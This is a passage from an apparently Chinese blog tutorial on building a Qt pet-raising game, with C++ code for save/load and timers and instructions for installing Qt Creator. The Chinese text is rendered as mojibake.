class="hljs-string">&quot;../PuppiesMakeAHome/database/Save4.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save4;<br>        pRead=ui-&gt;read4;<br>    &#125;<br><br>    <span class="hljs-function">QFile <span class="hljs-title">Fread</span><span class="hljs-params">(recordPath)</span></span>;<br>    <span class="hljs-keyword">if</span>(pSave-&gt;<span class="hljs-built_in">text</span>()==<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>)<br>    &#123;<br>        <span class="hljs-type">bool</span> isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::WriteOnly);<br>        <span class="hljs-keyword">if</span>(isExist)<br>        &#123;<br>            <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>            QString tmp=<span class="hljs-string">&quot;&quot;</span>;<br>            Family family;<br>            <span class="hljs-comment">//åˆå§‹åŒ–å®¶åº­</span><br><br>            Demo.<span class="hljs-built_in">Initial</span>();<br>            Demo.dogs.<span class="hljs-built_in">clear</span>();<br>            <span class="hljs-built_in">InitialStore</span>();<br>            <span class="hljs-built_in">InitialHome</span>();<br>            <span class="hljs-comment">//å®¶åº­ä¿¡æ¯</span><br>            <span class="hljs-keyword">while</span>(tmp==<span class="hljs-string">&quot;&quot;</span>)<br>            &#123;<br>                tmp=QInputDialog::<span class="hljs-built_in">getText</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;æç¤º&quot;</span>,<span class="hljs-built_in">QString</span>(<span class="hljs-string">&quot;&lt;h3&gt;è¯·ç»™å°å®¶èµ·ä¸ªåå­—å§ï¼š&lt;/h3&gt;&quot;</span>));<br>            &#125;<br>            Demo.<span class="hljs-built_in">setFamilyTitle</span>(tmp);<br>            ds&lt;&lt;Demo.<span class="hljs-built_in">getFamilyTitle</span>();<br>            pSave-&gt;<span class="hljs-built_in">setText</span>(Demo.<span class="hljs-built_in">getFamilyTitle</span>());<br>            pRead-&gt;<span class="hljs-built_in">setText</span>(Demo.<span class="hljs-built_in">getFamilyTitle</span>());<br><br>            Demo.<span class="hljs-built_in">setFamilyWealth</span>(<span class="hljs-number">30</span>);<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyWealth</span>());<br>            Demo.<span class="hljs-built_in">setFamilyLove</span>(<span class="hljs-number">5</span>);<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyLove</span>());<br><br>            QMessageBox::<span class="hljs-built_in">question</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;æ–°å»ºå®¶åº­æˆåŠŸ&quot;</span>,<span class="hljs-string">&quot;&lt;h3&gt;å¿«å»é¢†å…»ä¸€åªç‹—ç‹—å§ï¼&lt;/h3&gt;&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">InitInformation</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;è¯»æ¡£æˆåŠŸ&quot;</span>,<span class="hljs-string">&quot;å¿«å›å®¶çœ‹çœ‹å°ç‹—å§~&quot;</span>);<br>        <span class="hljs-type">bool</span> isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>        <span class="hljs-keyword">if</span>(isExist)&#123;<br>            <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>            QString itmp,jtmp,ktmp,stmp;<br><br>            <span class="hljs-comment">//åˆå§‹åŒ–</span><br>            Demo.<span class="hljs-built_in">Initial</span>();<br>            <span class="hljs-built_in">InitialHome</span>();<br><br>            <span class="hljs-comment">//å®¶åº­ä¿¡æ¯</span><br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyTitle</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyWealth</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyLove</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyReserveBonse</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyReserveDogfood</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyReserveMedicine</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setPlayerTime</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.member=stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>();<br><br>            <span class="hljs-comment">//ç‹—ç‹—ä¿¡æ¯</span><br>            Dog *dogTmp;  <span class="hljs-comment">// åœ¨ if-else ç»“æ„ä¹‹å‰å£°æ˜</span><br><br>            ds &gt;&gt; itmp;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; itmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>(); j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (Demo.member &gt; <span class="hljs-number">4</span>) &#123;<br>                    dogTmp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BigDog</span>();  <span class="hljs-comment">// åˆå§‹åŒ–å˜é‡</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    dogTmp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SmallDog</span>();  <span class="hljs-comment">// åˆå§‹åŒ–å˜é‡</span><br>                &#125;<br><br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogName</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogAbility</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogEnergy</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toDouble</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogIll</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogState</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogWorktime</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>                Demo.dogs.<span class="hljs-built_in">push_back</span>(dogTmp);<br><br>            &#125;<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br>    haveLoadGame=<span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">renovate</span>();<br>    <span class="hljs-built_in">InitialHome</span>();<br><br>    ui-&gt;stackedWidget-&gt;<span class="hljs-built_in">setCurrentWidget</span>(ui-&gt;home);<br><br>    <span class="hljs-comment">//ç¦ç”¨/å¯ç”¨æŒ‰é’®</span><br>    <span class="hljs-keyword">if</span>(haveLoadGame==<span class="hljs-number">0</span>)&#123;<br>        ui-&gt;pushButton_newmember-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">false</span>);<br>        ui-&gt;pushButton_gotostore-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">false</span>);<br>        ui-&gt;pushButton_honor-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">false</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        ui-&gt;pushButton_save-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">true</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//å­˜æ¡£</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::SaveRecord</span><span class="hljs-params">(QString recordPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> ret=QMessageBox::<span class="hljs-built_in">question</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;æç¤º&quot;</span>,<span class="hljs-string">&quot;ç¡®å®šè¦†ç›–å­˜æ¡£?&quot;</span>);<br>    <span class="hljs-keyword">if</span>(ret==QMessageBox::No) <span class="hljs-keyword">return</span>;<br><br>    QPushButton* pSave=ui-&gt;save1,*pRead=ui-&gt;read1;<br>    <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save1.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save1;<br>        pRead=ui-&gt;read1;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save2.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save2;<br>        pRead=ui-&gt;read2;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save3.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save3;<br>        pRead=ui-&gt;read3;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save4.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save4;<br>        pRead=ui-&gt;read4;<br>    &#125;<br><br><br>    <span class="hljs-function">QFile <span class="hljs-title">Fread</span><span class="hljs-params">(recordPath)</span></span>;<br>    <span class="hljs-type">bool</span> isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::WriteOnly);<br>    <span class="hljs-keyword">if</span>(isExist)<br>    &#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        <br><span class="hljs-comment">//æŒ‰é¡ºåºå­˜å‚¨å…³é”®ä¿¡æ¯ï¼Œè¯»æ¡£é¡ºåºéœ€å’Œå­˜æ¡£é¡ºåºä¸€è‡´</span><br>        <br>        <span class="hljs-comment">//å®¶åº­ä¿¡æ¯</span><br>        ds&lt;&lt;Demo.<span class="hljs-built_in">getFamilyTitle</span>();<br>        pSave-&gt;<span class="hljs-built_in">setText</span>(Demo.<span class="hljs-built_in">getFamilyTitle</span>());<br>        pRead-&gt;<span class="hljs-built_in">setText</span>(Demo.<span class="hljs-built_in">getFamilyTitle</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyWealth</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyLove</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyReserveBonse</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyReserveDogfood</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyReserveMedicine</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getPlayerTime</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.member);<br><br>        <span class="hljs-comment">//ç‹—ç‹—ä¿¡æ¯</span><br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs.<span class="hljs-built_in">size</span>());<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;Demo.dogs.<span class="hljs-built_in">size</span>();j++)<br>        &#123;<br>            ds&lt;&lt;Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogName</span>();<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogAbility</span>());<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogEnergy</span>());<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogIll</span>());<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogState</span>());<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogWorktime</span>());<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br>    <span class="hljs-built_in">InitialRecord</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="å®šæ—¶å™¨äº‹ä»¶"><a href="#å®šæ—¶å™¨äº‹ä»¶" class="headerlink" title="å®šæ—¶å™¨äº‹ä»¶"></a>å®šæ—¶å™¨äº‹ä»¶</h5><p>éœ€è¦åœ¨ä¸»ç•Œé¢å¤´æ–‡ä»¶ä¸­å£°æ˜å¦‚ä¸‹éƒ¨åˆ†:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QTimer&gt;</span></span><br><span class="hljs-comment">//public</span><br><span class="hljs-type">int</span> millisecondPerHour=<span class="hljs-number">10000</span>;      <span class="hljs-comment">//æ¸¸æˆé€Ÿç‡</span><br><span class="hljs-type">int</span> timerKiller;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">timerEvent</span><span class="hljs-params">(QTimerEvent *e)</span></span>;  <span class="hljs-comment">//è®¡æ—¶å™¨äº‹ä»¶</span><br></code></pre></td></tr></table></figure><p>cppæ–‡ä»¶ä¸­æ„é€ å¹¶ä½¿ç”¨å®šæ—¶å™¨ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//éœ€è¦æŒ‰æ—¶é—´åˆ·æ–°çš„å‡½æ•°ä¸€èµ·å†™åœ¨å®šæ—¶å™¨æ—¶é—´é‡Œ</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::timerEvent</span><span class="hljs-params">(QTimerEvent *)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> x;<br>    x=Demo.<span class="hljs-built_in">getPlayerTime</span>();<br>    Demo.<span class="hljs-built_in">setPlayerTime</span>(++x);<br>    <span class="hljs-built_in">InitialHome</span>();<br>    <span class="hljs-comment">//renovate();</span><br>    <span class="hljs-built_in">DogGrowing</span>();<br>    <span class="hljs-built_in">Initialchoose</span>();<br>&#125;<br><br><span class="hljs-comment">//åœæ­¢å®šæ—¶å™¨è¯­å¥ï¼Œæ’å…¥åœ¨åŠŸèƒ½å‡½æ•°ä¸­</span><br> <span class="hljs-built_in">killTimer</span>(timerKiller);<br><span class="hljs-comment">//å¼€å¯å®šæ—¶å™¨è¯­å¥</span><br>timerKiller=<span class="hljs-built_in">startTimer</span>(millisecondPerHour);<br></code></pre></td></tr></table></figure><h3 id="6-QTå›¾å½¢åŒ–ç•Œé¢éƒ¨åˆ†"><a href="#6-QTå›¾å½¢åŒ–ç•Œé¢éƒ¨åˆ†" class="headerlink" title="6.QTå›¾å½¢åŒ–ç•Œé¢éƒ¨åˆ†"></a>6.QTå›¾å½¢åŒ–ç•Œé¢éƒ¨åˆ†</h3><h4 id="6-1-QTç¯å¢ƒå‡†å¤‡"><a href="#6-1-QTç¯å¢ƒå‡†å¤‡" class="headerlink" title="6.1 QTç¯å¢ƒå‡†å¤‡"></a>6.1 QTç¯å¢ƒå‡†å¤‡</h4><blockquote><p>æˆ‘ä»¬ä¸‹è½½çš„è¿™ä¸ªç¨‹åºå°±æ˜¯QT Creator</p></blockquote><p>é¦–å…ˆä¸‹è½½QTï¼Œä¸‹è½½é“¾æ¥ï¼š<a href="https://download.qt.io/">Index of &#x2F; (qt.io)</a>ï¼Œé€‰æ‹© archive - qt&#x2F; </p><p>æˆ‘é€‰æ‹©äº†5.12.3ç‰ˆæœ¬ï¼Œç‚¹å‡»ç›´æ¥ä¸‹è½½ï¼Œè¿˜æŒºæ…¢çš„ğŸ¥²</p><p>ä¸‹è½½ä¹‹åè¿è¡Œ</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_14-15-44.png"></p><p>nextä¹‹åæç¤ºä½ ç™»å½•ï¼Œæ²¡æœ‰è´¦å·å»æ³¨å†Œä¸€ä¸ªå°±è¡Œï¼Œåªéœ€è¦å¡«ä¸€ä¸ªé‚®ç®±å’Œå¯†ç å°±è¡Œã€‚</p><blockquote><p>æˆ‘çœ‹åˆ°çš„æ•™ç¨‹é‡Œéƒ½æ˜¯ç›´æ¥è·³è¿‡ï¼Œä½†ç°åœ¨å¥½åƒä¸è¡Œäº†</p></blockquote><p>æ¥ä¸‹æ¥é€‰æ‹©å®‰è£…è·¯å¾„ï¼Œæˆ‘æ”¾åœ¨äº†Dç›˜å’Œè¿è¡Œç¨‹åºåœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œ</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_14-23-30.png"></p><p>é€‰æ‹©éœ€è¦çš„ç»„ä»¶ï¼Œå…¨é€‰çš„è¯å å†…å­˜å¾ˆå¤§æ²¡å¿…è¦ï¼Œæ¯•ç«Ÿæˆ‘ä»¬åªæ˜¯åšä¸ªä½œä¸šåˆä¸ä¼šç”¨å®ƒåšå¾ˆå¤šä¸œè¥¿ã€‚</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_14-25-33.png"></p><p>è¿™é‡Œè¦æ”¹æˆåŒæ„å—·ğŸ‘‡ğŸ¼</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_14-29-48.png"></p><p>ä¸‹ä¸€é¡µå¿˜è®°æˆªå›¾äº†å°±æ˜¯å®‰è£…æ¡Œé¢å¿«æ·æ–¹å¼ï¼Œç›´æ¥é»˜è®¤nextå°±å¥½ã€‚æ¥ä¸‹æ¥å°±æ˜¯ç­‰å¾…å®‰è£…å•¦ï¼Œæ—¶é—´å¾ˆé•¿å¯ä»¥å»è·‘ä¸ªä¸¤å…¬é‡Œã€‚</p><p>æœ‰äº›æ•™ç¨‹ä¸Šä¼šè®²åˆ°é…ç½®ç¯å¢ƒå˜é‡ï¼Œå› ä¸ºæˆ‘æœ¬æ¥å°±æœ‰C++çš„ç¼–è¯‘ç¯å¢ƒå°±ä¸éœ€è¦è¾£</p><h5 id="åœŸç‹—å‘è¨€"><a href="#åœŸç‹—å‘è¨€" class="headerlink" title="åœŸç‹—å‘è¨€"></a>åœŸç‹—å‘è¨€</h5><p>Qt Creatoræ˜¯ä¸€ä¸ªé›†æˆç¯å¢ƒï¼Œå®ƒé›†æˆäº†Qt Designerï¼Œå¯ä»¥ç›´æ¥ä»Qt Creatorä¸­æ‰“å¼€å’Œç¼–è¾‘.uiæ–‡ä»¶ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥æœç´¢åˆ°Qt Designerè¿è¡Œç¨‹åºå¹¶å•ç‹¬ä½¿ç”¨å®ƒã€‚</p><p>æˆ‘è®¤ä¸ºå¦‚æœæœ‰åŒå±ï¼Œå†å¼€ä¸€ä¸ªQt Designerå•ç‹¬ç¼–è¾‘é¡µé¢å¸ƒå±€å·¥ä½œæ•ˆç‡æ›´é«˜ã€‚</p><h4 id="6-2-QTè¾¹å­¦è¾¹å†™"><a href="#6-2-QTè¾¹å­¦è¾¹å†™" class="headerlink" title="6.2 QTè¾¹å­¦è¾¹å†™"></a>6.2 QTè¾¹å­¦è¾¹å†™</h4><p><strong>QTé¡¹ç›®éœ€æ±‚</strong></p><ul><li>æ¸¸æˆèƒŒæ™¯ä¸ºä¸€ä¸ªæˆ¿é—´å†…éƒ¨çš„é™æ€å›¾ç‰‡</li><li>é¼ æ ‡æ‚¬åœåœ¨å®¶åº­æˆå‘˜å°ç‹—èº«ä¸Šæ—¶æ˜¾ç¤ºå¯¹åº”çš„å®¶åº­æˆå‘˜çš„ä¿¡æ¯</li><li>ç‚¹å‡»å°ç‹—å®¶åº­æˆå‘˜å¯ä»¥é€‰æ‹©è¦è¿›è¡Œçš„æ´»åŠ¨</li><li>é¡µé¢ä¾§è¾¹æœ‰å‡ ä¸ªé€‰é¡¹å¯ä»¥é€‰æ‹©å¯¹åº”çš„æ´»åŠ¨</li><li>é¡µé¢é¡¶éƒ¨æ˜¾ç¤ºå®¶åº­ä¿¡æ¯</li></ul><h5 id="6-2-1-åˆ›å»ºæ–°é¡¹ç›®"><a href="#6-2-1-åˆ›å»ºæ–°é¡¹ç›®" class="headerlink" title="6.2.1 åˆ›å»ºæ–°é¡¹ç›®"></a>6.2.1 åˆ›å»ºæ–°é¡¹ç›®</h5><p>é€‰æ‹©æ–°å»ºnew projectï¼Œchooseç¬¬ä¸€ä¸ªï¼Œè®¾ç½®æ„å»ºè·¯å¾„ååœ¨ç±»åé€‰æ‹©éƒ¨åˆ†é€‰æ‹©widgetï¼Œæ³¨æ„è·¯å¾„ä¸­ä¸èƒ½æœ‰ä¸­æ–‡ã€‚</p><p>è¿™ä¸ªåœ°æ–¹è¦æŠŠå‹¾é€‰å–æ¶ˆğŸ‘‡ğŸ¼</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_15-27-02.png"></p><p>ä¼šç›´æ¥ç”Ÿæˆæ¡†æ¶ï¼Œè¿™æ—¶å¦‚æœ<code>ctrl+R</code>ï¼ˆç¼–è¯‘å¹¶è¿è¡Œï¼‰ä¼šå¼¹å‡ºä¸€ä¸ªç©ºçš„å°ç™½æ¡†</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_15-28-34.png"></p><h5 id="6-2-2-ä¸»åœºæ™¯è®¾ç½®"><a href="#6-2-2-ä¸»åœºæ™¯è®¾ç½®" class="headerlink" title="6.2.2 ä¸»åœºæ™¯è®¾ç½®"></a>6.2.2 ä¸»åœºæ™¯è®¾ç½®</h5><p>æ–°å»ºä¸€ä¸ªå¤´æ–‡ä»¶config.hï¼Œæ·»åŠ ä¸»åœºæ™¯ä¿¡æ¯</p><h6 id="çª—å£å¤§å°å’Œæ ‡é¢˜è®¾ç½®"><a href="#çª—å£å¤§å°å’Œæ ‡é¢˜è®¾ç½®" class="headerlink" title="çª—å£å¤§å°å’Œæ ‡é¢˜è®¾ç½®"></a>çª—å£å¤§å°å’Œæ ‡é¢˜è®¾ç½®</h6><p>å¯¹åº”å›¾ç‰‡ä¿¡æ¯è®¾ç½®ç›¸å¯¹åº”çš„ç•Œé¢ä¿¡æ¯ï¼Œåœ¨è¿™é‡Œæˆ‘çš„å›¾ç‰‡æœ‰ç‚¹å°ï¼Œæ‰€ä»¥æˆ‘æŠŠå¯¹åº”æ•°æ®éƒ½ä¹˜äº†2</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-26_13-57-38.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//æ¸¸æˆé…ç½®æ•°æ®</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GAME_WIDTH  1282  <span class="hljs-comment">//ç•Œé¢çš„å®½åº¦</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GAME_HEIGHT 792   <span class="hljs-comment">//ç•Œé¢çš„é«˜åº¦</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GAME_TITLE <span class="hljs-string">&quot;å°ç‹—æ’‘èµ·ä¸€ä¸ªå®¶&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GAME_ICON <span class="hljs-string">&quot;:/img/favicon.ico&quot;</span> <span class="hljs-comment">//å›¾æ ‡åŠ è½½è·¯å¾„</span></span><br></code></pre></td></tr></table></figure><p>å†åœ¨ä¸»å¤´æ–‡ä»¶ä¸­æ·»åŠ ç›¸åº”è¯­å¥ï¼Œå¿«æ·é”®alt+enteråœ¨.cppæ–‡ä»¶ä¸­æ·»åŠ å®šä¹‰</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-26_14-09-45.png"></p><p>å¯¹åº”çš„.cppä»£ç ï¼Œè®°å¾—åœ¨ç¬¬ä¸€ä¸ªå‡½æ•°ä¸­å£°æ˜<code>initScene()</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//åˆå§‹åŒ–ç•Œé¢é…ç½®</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MainWindow::initScene</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//è®¾ç½®çª—å£å°ºå¯¸</span><br>    <span class="hljs-built_in">setFixedSize</span>(GAME_WIDTH,GAME_HEIGHT);<br><br>    <span class="hljs-comment">//è®¾ç½®æ ‡é¢˜</span><br>    <span class="hljs-built_in">setWindowTitle</span>(GAME_TITLE);<br><br>    <span class="hljs-comment">//åŠ è½½å›¾æ ‡</span><br>    <span class="hljs-built_in">setWindowIcon</span>(<span class="hljs-built_in">QIcon</span>(GAME_ICON));<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="èƒŒæ™¯å’Œå›¾æ ‡è®¾ç½®"><a href="#èƒŒæ™¯å’Œå›¾æ ‡è®¾ç½®" class="headerlink" title="èƒŒæ™¯å’Œå›¾æ ‡è®¾ç½®"></a>èƒŒæ™¯å’Œå›¾æ ‡è®¾ç½®</h6><p>åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹æ–°å»ºæ–‡ä»¶ï¼Œé€‰æ‹©QT-resource</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-26_14-21-47.png"></p><p>å³é”®å•å‡»æ–‡ä»¶æ‰“å¼€ï¼ŒæŠŠå›¾ç‰‡ç´ æéƒ½æ”¾è¿›å»</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-26_15-33-21.png"></p><blockquote><p>è‡³æ­¤ï¼Œæˆ‘æ¨ç¿»é‡æ¥ã€‚å‘ç°è‡ªå·±å»ºæ–‡ä»¶çš„æ—¶å€™å»ºæˆäº†mainwindowsã€‚ğŸ¥²</p></blockquote><h6 id="UIç•Œé¢"><a href="#UIç•Œé¢" class="headerlink" title="UIç•Œé¢"></a>UIç•Œé¢</h6><p>ä½¿ç”¨å®¹å™¨Stacked 